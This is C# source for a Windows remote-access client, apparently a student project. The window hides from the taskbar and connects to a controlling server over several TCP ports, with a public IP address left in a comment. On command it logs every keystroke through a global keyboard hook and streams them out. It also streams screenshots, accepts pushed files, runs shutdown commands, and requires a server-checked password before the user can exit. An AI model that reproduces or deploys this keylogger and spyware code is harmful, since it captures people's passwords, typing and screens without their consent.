using Keystroke.API;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using Screna;
using System.IO;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Diagnostics;
using System.Linq;

namespace Client
{
    public partial class Form1 : Form
    {
        private TcpClient client;
        private TcpClient keylogClient;
        private TcpClient shareClient;
        private TcpClient fileClient;
        private NetworkStream mainstream;
        private NetworkStream keylogStream;
        private NetworkStream ScreenStream;
        private NetworkStream fileStream;

        private IPEndPoint IPServer;
        private IPEndPoint IPKeyServer;
        private IPEndPoint IPShare;
        private IPEndPoint IPFile;

        private Thread BeginKeylg;
        private Thread ClientConnect;
        private Thread ScreenThread;
        private Thread FileThread;

        private static ManualResetEvent screenEvent = new ManualResetEvent(false);

        string KEY;
        bool IsExit = false;

        bool isKeyThreadStart = false;
        bool isScreenThreadStart = false;
        public Form1()
        {
            InitializeComponent();
            this.ShowInTaskbar = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            ClientConnect = new Thread(Connect2Server);
            ClientConnect.Start();
            ClientConnect.IsBackground = true;
        }

        void Connect2Server()
        {
            try
            {
                client = new TcpClient();
                keylogClient = new TcpClient();
                shareClient = new TcpClient();
                fileClient = new TcpClient();

                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9000);
                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9001);
                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9002);
                IPFile = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9003);



                client.Connect(IPServer);
                shareClient.Connect(IPShare);
                keylogClient.Connect(IPKeyServer);
                fileClient.Connect(IPFile);


                /*IPServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 14232);
                IPKeyServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 15202);
                IPShare = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 12896);*/

                ScreenThread = new Thread(SendImage);
                ScreenThread.IsBackground = true;
                BeginKeylg = new Thread(KeyLog);
                BeginKeylg.IsBackground = true;

                GetKeyFromServer();
                GetCommand();

            }
            catch (Exception ex)
            {
                MessageBox.Show("Some client dont connect");
                MessageBox.Show(ex.ToString());
            }
        }


        void GetKeyFromServer()
        {
            try
            {
                mainstream = client.GetStream();
                byte[] data = new byte[1024];
                int numBytesRead = mainstream.Read(data, 0, data.Length);
                string receivedData = Encoding.ASCII.GetString(data, 0, numBytesRead);

                if (numBytesRead > 0)
                {
                    KEY = receivedData;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }


        private void GetCommand()
        {
            
            while (client.Connected)
            {
                try
                {
                    mainstream = client.GetStream();
                    byte[] data = new byte[1024];
                    int numBytesRead=mainstream.Read(data, 0, data.Length);

                    string command = Encoding.ASCII.GetString(data, 0, numBytesRead);

                    if (command == "Key-log")
                    {
                        if(!isKeyThreadStart)
                    {
                            isKeyThreadStart = true;
                            BeginThreadLog();
                        }
                    }
                    else if (command == "Exit")
                    {
                        MessageBox.Show("Password is correct!");
                        ExitApplication();
                        return; // Break out of the while loop after the client has exited
                    }
                    else if (command == "transfer-file")
                    {
                        if (!isKeyThreadStart)
                        {
                            isKeyThreadStart = true;
                            BeginTransFile();
                        }
                    }
                    else if (command.StartsWith("shutdown -s -t"))
                    {
                        String[] separator = { "shutdown" };
                        String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                        Shutdown(arg);
                    }

                    else if (command == "shutdown -a")
                    {
                        String[] separator = { "shutdown" };
                        String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                        Shutdown(arg);
                    }
                    else
                    {
                        if (command =="Share-Screen")
                        {
                            if (!ScreenThread.IsAlive)
                            {
                                    isScreenThreadStart = true;
                                    BeginThreadShareScreen();
                            }
                            else
                            {
                                isKeyThreadStart= false;
                                screenEvent.Set();
                            }
                        }

                    }
                    if(command =="Stop-Share")
                    {
                        isScreenThreadStart = true;
                    }
                }

                catch (IOException ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            Application.Exit();
        }

        private void ExitApplication()
        {
            // Clean up resources before exiting
            if (mainstream != null)
            {
                mainstream.Close();
            }
            if (client != null)
            {
                client.Close();
            }
            Application.Exit();
        }

        void Shutdown(string command)
        {
            System.Diagnostics.Process.Start("shutdown", command);
        }

        void BeginTransFile()
        {
            try
            {
                FileThread = new Thread(TransFile);
                FileThread.Start();
                FileThread.IsBackground = true;

                fileStream = fileClient.GetStream();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Thread of transfering file end.");
                MessageBox.Show(ex.ToString());
            }
        }
        void TransFile()
        {
            try
            {
                StreamReader sr = new StreamReader(fileStream);
                string fileName = sr.ReadLine(); // Đọc tên tệp

                string path = Path.Combine("./", fileName); // Đường dẫn tới tệp bao gồm tên tệp
                FileStream fs = new FileStream(path, FileMode.CreateNew); // Tạo FileStream với đường dẫn tới tệp mới

                
                byte[] data = new byte[1024];
                int receivedBytes;
                while ((receivedBytes = fileStream.Read(data, 0, data.Length)) > 0)
                {
                    fs.Write(data, 0, receivedBytes);
                }
                MessageBox.Show("Done!!");
                fs.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to receive file.");
                MessageBox.Show(ex.ToString());
            }
        }






        void BeginThreadLog()
        {
            try
            {
                

                BeginKeylg = new Thread(KeyLog);
                BeginKeylg.Start();
                BeginKeylg.IsBackground = true;
                
                keylogStream = keylogClient.GetStream();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Thread end.");
                MessageBox.Show(ex.ToString());
            }
        }

        void BeginThreadShareScreen()
        {
            try
            {
                isScreenThreadStart= true;
                ScreenThread.Start();

                ScreenStream = shareClient.GetStream();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Share Screen Thread end.");
                MessageBox.Show(ex.ToString());
            }
        }

        void SendKeylloger(string s)
        {
            byte[] msg = UTF8Encoding.UTF8.GetBytes(s);
            keylogStream.Write(msg, 0, msg.Length);
        }

        void KeyLog()
        {
            try
            {
                
                while (keylogClient.Connected)
                {
                    using (var api = new KeystrokeAPI())
                    {
                        api.CreateKeyboardHook((character) => { SendKeylloger(character.ToString()); });
                        Application.Run();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Keylog func end.");
                MessageBox.Show(ex.ToString());
            }
        }

/*        void ScreenConnect()
        {
            try
            {
                shareClient = new TcpClient();
                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8002);
                shareClient.Connect(IPShare);
                ScreenStream = shareClient.GetStream();
                SendImage();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }*/

        void SendImage()
        {
            try
            {
                while (shareClient.Connected)
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    ScreenStream = shareClient.GetStream();
                    binaryFormatter.Serialize(ScreenStream, GrabDesktop());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Share end.");
                MessageBox.Show(ex.Message);
            }
        }


        [DllImport("gdi32.dll", CharSet = CharSet.Auto, SetLastError = true, ExactSpelling = true)]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);


        public static double GetWindowsScreenScalingFactor(bool percentage = true)
        {
            using (Graphics graphicsObject = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr deviceContextHandle = graphicsObject.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(deviceContextHandle, 10);
                int physicalScreenHeight = GetDeviceCaps(deviceContextHandle, 117);

                double scalingFactor = Math.Round(physicalScreenHeight / (double)logicalScreenHeight, 2);

                if (percentage)
                {
                    scalingFactor *= 100.0;
                }

                return scalingFactor;
            }
        }

        public static Size GetDisplayResolution()
        {
            var sf = GetWindowsScreenScalingFactor(false);
            var screenWidth = Screen.PrimaryScreen.Bounds.Width * sf;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height * sf;
            return new Size((int)screenWidth, (int)screenHeight);
        }



        private Image GrabDesktop()
        {
            Rectangle rect = Screen.PrimaryScreen.Bounds;

            rect.Height = (int)(GetDisplayResolution().Height);
            rect.Width = (int)(GetDisplayResolution().Width);


            Bitmap screenBitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
            Graphics screenGraphics = Graphics.FromImage(screenBitmap);
            screenGraphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
            return screenBitmap;
        }

        private void contextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
            ClientConnect = new Thread(Connect2Server);
            ClientConnect.Start();
            ClientConnect.IsBackground = true;
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            String input_from_client = Microsoft.VisualBasic.Interaction.InputBox("Enter password to exit:", "Password", "", -1, -1);

            string encoded_input_from_client = VigenereEncrypt(input_from_client, KEY);

                // Gửi encoded_input_from_client tới server
                if (client.Connected)
                {
                    byte[] buffer = Encoding.ASCII.GetBytes(encoded_input_from_client);
                    mainstream.Write(buffer, 0, buffer.Length);
                }
        }


        public static string VigenereEncrypt(string plainText, string key)
        {
            string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string encryptedText = "";
            int keyIndex = 0;

            foreach (char plainChar in plainText)
            {
                char upperPlainChar = Char.ToUpper(plainChar);

                if (alphabet.Contains(upperPlainChar))
                {
                    // Find the position of the character in the alphabet
                    int plainIndex = alphabet.IndexOf(upperPlainChar);

                    // Find the position of the corresponding keyword character
                    char keyChar = Char.ToUpper(key[keyIndex % key.Length]);
                    int keyIndexInAlphabet = alphabet.IndexOf(keyChar);

                    // Encrypt the character by adding the position of the keyword character
                    int encryptedIndex = (plainIndex + keyIndexInAlphabet) % alphabet.Length;
                    char encryptedChar = alphabet[encryptedIndex];

                    // If the original character was lowercase, make the encrypted character lowercase
                    if (Char.IsLower(plainChar))
                    {
                        encryptedChar = Char.ToLower(encryptedChar);
                    }

                    encryptedText += encryptedChar;

                    // Move on to the next character of the keyword
                    keyIndex++;
                }
                else
                {
                    encryptedText += plainChar;
                }
            }

            return encryptedText;
        }

    }
}